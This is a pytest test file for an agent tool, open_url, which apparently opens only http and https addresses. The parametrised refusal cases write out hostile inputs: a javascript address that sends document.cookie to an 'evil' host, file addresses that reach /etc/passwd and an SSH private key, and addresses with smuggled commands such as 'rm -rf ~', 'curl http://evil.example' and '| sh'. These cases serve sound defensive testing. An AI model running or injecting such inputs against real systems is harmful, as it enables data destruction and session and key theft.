"""open_url must open web pages and refuse everything else.

The tool never asks for approval, so the refusals are the whole safety story.
Every case here is a pair: the input, and the property that would break if the
tool accepted it.
"""

from __future__ import annotations

import pytest

from peppermint.daemon import tools
from peppermint.daemon.tools import web
from peppermint.daemon.tools.registry import Confirm, Context, ToolError


@pytest.fixture
def ctx():
    return Context(task_id=1, db=None, approved=False)


@pytest.fixture
def opened(monkeypatch):
    """Record what would have been launched instead of opening a browser."""
    calls: list[list[str]] = []

    class Result:
        returncode = 0
        stdout = ""
        stderr = ""

    def fake_run(args, **kwargs):
        calls.append(list(args))
        return Result()

    monkeypatch.setattr(web.subprocess, "run", fake_run)
    monkeypatch.setattr(web.shutil, "which", lambda name: "/usr/bin/xdg-open")
    return calls


# --- addresses that open --------------------------------------------------

@pytest.mark.parametrize("given, expected", [
    ("https://youtube.com", "https://youtube.com"),
    ("http://example.com", "http://example.com"),
    ("https://x.com/home", "https://x.com/home"),
    ("https://www.fidelity.com", "https://www.fidelity.com"),
    ("HTTPS://Example.COM", "HTTPS://Example.COM"),
    ("https://youtube.com/watch?v=abc123&t=42s", "https://youtube.com/watch?v=abc123&t=42s"),
    ("https://en.wikipedia.org/wiki/Mint#History", "https://en.wikipedia.org/wiki/Mint#History"),
    ("https://example.com:8443/path", "https://example.com:8443/path"),
])
def test_a_full_web_address_is_kept_as_it_is(given, expected):
    assert web.normalise(given) == expected


@pytest.mark.parametrize("given, expected", [
    ("youtube.com", "https://youtube.com"),
    ("x.com", "https://x.com"),
    ("www.fidelity.com", "https://www.fidelity.com"),
    ("youtube.com/watch?v=abc", "https://youtube.com/watch?v=abc"),
    ("news.bbc.co.uk", "https://news.bbc.co.uk"),
    ("  youtube.com  ", "https://youtube.com"),
    ("example.com:8080", "https://example.com:8080"),
    ("localhost:11434", "https://localhost:11434"),
])
def test_a_plain_domain_becomes_https(given, expected):
    """The user says 'open youtube.com'. That means the web site."""
    assert web.normalise(given) == expected


def test_a_port_is_not_mistaken_for_a_scheme():
    """`example.com:8080` starts like `scheme:` but the colon leads to a port."""
    assert web.normalise("example.com:8080").startswith("https://")


# --- schemes that must never open -----------------------------------------

@pytest.mark.parametrize("address, why", [
    ("file:///etc/passwd", "a file address reads the disk"),
    ("file:///home/jesse/.ssh/id_rsa", "a file address can reach a private key"),
    ("javascript:alert(1)", "javascript runs code in a page the user is logged into"),
    ("javascript:fetch('http://evil/'+document.cookie)", "javascript can steal a session"),
    ("data:text/html,<script>alert(1)</script>", "a data address builds a page out of nothing"),
    ("vbscript:msgbox(1)", "another way to run code"),
    ("mailto:someone@example.com", "not a web page"),
    ("ftp://example.com/x", "not http or https"),
    ("ssh://user@host", "reaches another machine"),
    ("chrome://settings", "a browser-internal page"),
    ("about:config", "a browser-internal page"),
    ("smb://server/share", "a network file share"),
])
def test_a_scheme_that_is_not_http_never_opens(address, why):
    with pytest.raises(ToolError):
        web.normalise(address)


@pytest.mark.parametrize("address", [
    "FILE:///etc/passwd",
    "JavaScript:alert(1)",
    "DATA:text/html,x",
])
def test_the_spelling_of_a_scheme_does_not_hide_it(address):
    """Upper case must not slip past the check."""
    with pytest.raises(ToolError):
        web.normalise(address)


# --- local paths ----------------------------------------------------------

@pytest.mark.parametrize("address", [
    "/etc/passwd",
    "/home/jesse/notes.txt",
    "./script.sh",
    "../../etc/shadow",
    "~/.ssh/id_rsa",
])
def test_a_path_on_this_computer_is_not_a_web_address(address):
    with pytest.raises(ToolError):
        web.normalise(address)


# --- shell syntax and embedded commands -----------------------------------

@pytest.mark.parametrize("address", [
    "https://example.com; rm -rf ~",
    "https://example.com && curl http://evil.example",
    "https://example.com | sh",
    "https://example.com`whoami`",
    "https://example.com/$(rm -rf ~)",
    "https://example.com\nrm -rf ~",
    "https://example.com'; rm -rf ~; '",
    'https://example.com" && evil',
    "https://example.com>out.txt",
    "https://example.com<in.txt",
    # No spaces anywhere: these must be caught by the character rules, not by
    # the check that refuses a space.
    "https://example.com;rm",
    "https://example.com&&curl",
    "https://example.com||curl",
    "youtube.com;wget",
])
def test_shell_syntax_is_refused(address):
    """The address never reaches a shell, and a malformed one is still refused."""
    with pytest.raises(ToolError):
        web.normalise(address)


@pytest.mark.parametrize("address", [
    "https://youtube.com/watch?v=abc&t=42s",
    "https://example.com/search?q=mint&page=2#results",
    "https://example.com/a+b,c(d)",
])
def test_a_real_query_string_still_opens(address):
    """`?`, `&` and `#` are needed by real links, so they must stay allowed."""
    assert web.normalise(address) == address


# --- malformed input ------------------------------------------------------

@pytest.mark.parametrize("address", [
    "",
    "   ",
    "not a domain",
    "https://",
    "http://",
    "justaword",
    "https://-bad-.com",
    "https://exam ple.com",
    "\x00https://example.com",
])
def test_malformed_input_is_refused(address):
    with pytest.raises(ToolError):
        web.normalise(address)


def test_a_refusal_says_why():
    with pytest.raises(ToolError) as exc:
        web.normalise("file:///etc/passwd")
    assert "file" in str(exc.value).lower()


# --- the tool itself ------------------------------------------------------

def test_opening_a_web_page_never_asks_for_approval(opened, ctx):
    """This is the point of the tool: no Confirm, ever."""
    outcome = tools.call("open_url", {"url": "https://youtube.com"}, ctx)
    assert not isinstance(outcome, Confirm)
    assert "youtube.com" in str(outcome)


@pytest.mark.parametrize("given", [
    "youtube.com", "https://x.com", "http://example.com", "www.fidelity.com",
])
def test_no_valid_address_ever_returns_confirm(opened, ctx, given):
    assert not isinstance(tools.call("open_url", {"url": given}, ctx), Confirm)


def test_the_address_reaches_xdg_open_as_one_argument(opened, ctx):
    """One argument in a list. No shell, so nothing inside it can be a command."""
    tools.call("open_url", {"url": "youtube.com"}, ctx)
    assert opened == [["/usr/bin/xdg-open", "https://youtube.com"]]


def test_several_sites_open_through_separate_calls(opened, ctx):
    """'open x.com, Fidelity and YouTube' is three calls, not one."""
    for site in ("x.com", "fidelity.com", "youtube.com"):
        tools.call("open_url", {"url": site}, ctx)
    assert [call[1] for call in opened] == [
        "https://x.com", "https://fidelity.com", "https://youtube.com",
    ]


def test_a_refused_address_never_reaches_the_desktop(opened, ctx):
    """A refusal must stop before anything is launched."""
    with pytest.raises(ToolError):
        tools.call("open_url", {"url": "file:///etc/passwd"}, ctx)
    assert opened == []


def test_a_failing_opener_is_reported(monkeypatch, ctx):
    class Result:
        returncode = 3
        stdout = ""
        stderr = "no application handles this"

    monkeypatch.setattr(web.shutil, "which", lambda name: "/usr/bin/xdg-open")
    monkeypatch.setattr(web.subprocess, "run", lambda *a, **k: Result())
    with pytest.raises(ToolError) as exc:
        tools.call("open_url", {"url": "https://example.com"}, ctx)
    assert "no application handles this" in str(exc.value)


def test_a_missing_opener_is_reported(monkeypatch, ctx):
    monkeypatch.setattr(web.shutil, "which", lambda name: None)
    with pytest.raises(ToolError) as exc:
        tools.call("open_url", {"url": "https://example.com"}, ctx)
    assert "xdg-open" in str(exc.value)


# --- the tool is wired in the same way as the others ----------------------

def test_open_url_is_registered():
    assert "open_url" in tools.tool_names()


def test_the_model_is_told_to_prefer_open_url():
    from peppermint.daemon.agent import system_prompt

    assert "open_url" in system_prompt()


def test_run_shell_still_refuses_to_open_a_browser(ctx):
    """open_url must not become a reason to loosen run_shell."""
    from peppermint.daemon import safety

    for command in ("xdg-open https://example.com", "firefox https://example.com"):
        assert not safety.classify_command(command).safe
